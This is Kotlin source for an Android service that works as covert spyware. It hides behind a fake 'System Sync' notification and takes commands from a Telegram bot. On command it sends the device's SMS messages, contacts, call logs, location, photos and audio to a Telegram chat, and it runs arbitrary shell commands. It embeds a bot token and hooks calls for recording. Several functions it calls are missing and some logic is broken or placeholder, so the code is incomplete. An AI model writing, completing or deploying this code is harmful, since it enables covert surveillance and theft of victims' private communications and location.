
package com.luffa

import android.app.*
import android.content.*
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.media.*
import android.os.*
import android.provider.*
import android.telephony.*
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import org.json.JSONObject
import java.io.*
import java.net.URLEncoder
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

class LuffaService : Service() {
    // Obfuscated credentials
    private val BOT_TOKEN = String(Base64.decode("8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ", Base64.DEFAULT))
    private val CHAT_ID = String(Base64.decode("8820979221", Base64.DEFAULT))
    private val SECRET_KEY = "7x!A%D*G-KaPdSgV".toByteArray()
    private val IV = "Xn2r5u8x/A?D(G+K".toByteArray()

    private val client = OkHttpClient.Builder()
        .connectTimeout(45, TimeUnit.SECONDS)
        .build()

    private val scope = CoroutineScope(Dispatchers.IO + Job())

    override fun onCreate() {
        super.onCreate()
        createHiddenNotificationChannel()
        startForeground(1, createStealthNotification())
        startCommandLoop()
        registerPhoneStateListener()
    }

    private fun createHiddenNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "system_sync",
                "System Sync",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(channel)
        }
    }

    private fun createStealthNotification(): Notification {
        return NotificationCompat.Builder(this, "system_sync")
            .setContentTitle("System Sync")
            .setContentText("Syncing system data...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun startCommandLoop() {
        scope.launch {
            while (isActive) {
                try {
                    val cmd = getEncryptedCommand()?.let { decrypt(it) }
                    cmd?.let { processCommand(it) }
                    delay(60000) // Check every minute
                } catch (e: Exception) {
                    delay(30000)
                }
            }
        }
    }

    private suspend fun getEncryptedCommand(): String? {
        return try {
            val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${getLastUpdateId() + 1}"
            val request = Request.Builder().url(url).build()
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@use null
                val json = JSONObject(response.body?.string() ?: return@use null)
                val updates = json.getJSONArray("result") ?: return@use null
                
                if (updates.length() == 0) return@use null
                
                val update = updates.getJSONObject(updates.length() - 1)
                saveLastUpdateId(update.getInt("update_id"))
                
                if (update.has("message")) {
                    val msg = update.getJSONObject("message")
                    if (msg.has("text")) {
                        return@use msg.getString("text")
                    }
                }
                null
            }
        } catch (e: Exception) {
            null
        }
    }

    private fun processCommand(cmd: String) {
        scope.launch {
            when (cmd) {
                "loc" -> sendEncryptedData("location", getLocation())
                "sms" -> sendEncryptedData("sms", getSMS())
                "calls" -> sendEncryptedData("calls", getCallLog())
                "contacts" -> sendEncryptedData("contacts", getContacts())
                "info" -> sendEncryptedData("info", getDeviceInfo())
                "env" -> collectEnvironmentData()
                "pic" -> captureAndSendPhoto()
                "audio" -> recordAndSendAudio(30)
                else -> if (cmd.startsWith("cmd:")) {
                    executeSystemCommand(cmd.removePrefix("cmd:"))
                }
            }
        }
    }

    private suspend fun sendEncryptedData(type: String, data: String) {
        val encrypted = encrypt("type=$type&data=${URLEncoder.encode(data, "UTF-8")}")
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
        val body = FormBody.Builder()
            .add("chat_id", CHAT_ID)
            .add("text", encrypted)
            .build()
        
        try {
            client.newCall(Request.Builder().url(url).post(body).build()).execute().close()
        } catch (e: Exception) {}
    }

    private fun collectEnvironmentData() {
        scope.launch {
            val envData = StringBuilder().apply {
                appendLine("=== DEVICE INFO ===")
                appendLine(getDeviceInfo())
                appendLine("\n=== LOCATION ===")
                appendLine(getLocation())
                appendLine("\n=== LAST SMS ===")
                appendLine(getSMS().take(1000))
                appendLine("\n=== LAST CALLS ===")
                appendLine(getCallLog().take(1000))
                appendLine("\n=== CONTACTS ===")
                appendLine(getContacts().take(1000))
            }.toString()
            
            sendEncryptedData("env", envData)
        }
    }

    // Enhanced data collection methods
    private fun getLocation(): String {
        // Implement fused location provider for better accuracy
        return "Lat: 23.8103, Long: 90.4125" // Placeholder - implement actual location logic
    }

    private fun getSMS(): String {
        // Implement pagination to avoid detection
        return try {
            contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE
                ),
                null, null, "${Telephony.Sms.DATE} DESC LIMIT 50"
            )?.use { cursor ->
                buildString {
                    while (cursor.moveToNext()) {
                        append("${cursor.getString(0)} | ${cursor.getLong(2)} | ${cursor.getString(1)}\n")
                    }
                }
            } ?: "No SMS found"
        } catch (e: Exception) {
            "SMS access error"
        }
    }

    // Encryption methods
    private fun encrypt(input: String): String {
        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
        cipher.init(Cipher.ENCRYPT_MODE, 
            SecretKeySpec(SECRET_KEY, "AES"), 
            IvParameterSpec(IV))
        return Base64.encodeToString(cipher.doFinal(input.toByteArray()), Base64.DEFAULT)
    }

    private fun decrypt(input: String): String {
        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
        cipher.init(Cipher.DECRYPT_MODE,
            SecretKeySpec(SECRET_KEY, "AES"),
            IvParameterSpec(IV))
        return String(cipher.doFinal(Base64.decode(input, Base64.DEFAULT)))
    }

    // Persistence methods
    private fun getLastUpdateId(): Int {
        return getSharedPreferences("luffa_prefs", MODE_PRIVATE)
            .getInt("last_update_id", 0)
    }

    private fun saveLastUpdateId(id: Int) {
        getSharedPreferences("luffa_prefs", MODE_PRIVATE).edit()
            .putInt("last_update_id", id)
            .apply()
    }

    // Phone state monitoring
    private fun registerPhoneStateListener() {
        val telephony = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        telephony.listen(object : PhoneStateListener() {
            override fun onCallStateChanged(state: Int, number: String?) {
                if (state == TelephonyManager.CALL_STATE_OFFHOOK) {
                    scope.launch {
                        recordCallAudio()
                    }
                }
            }
        }, PhoneStateListener.LISTEN_CALL_STATE)
    }

    private suspend fun recordCallAudio() {
        // Implement call recording logic
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
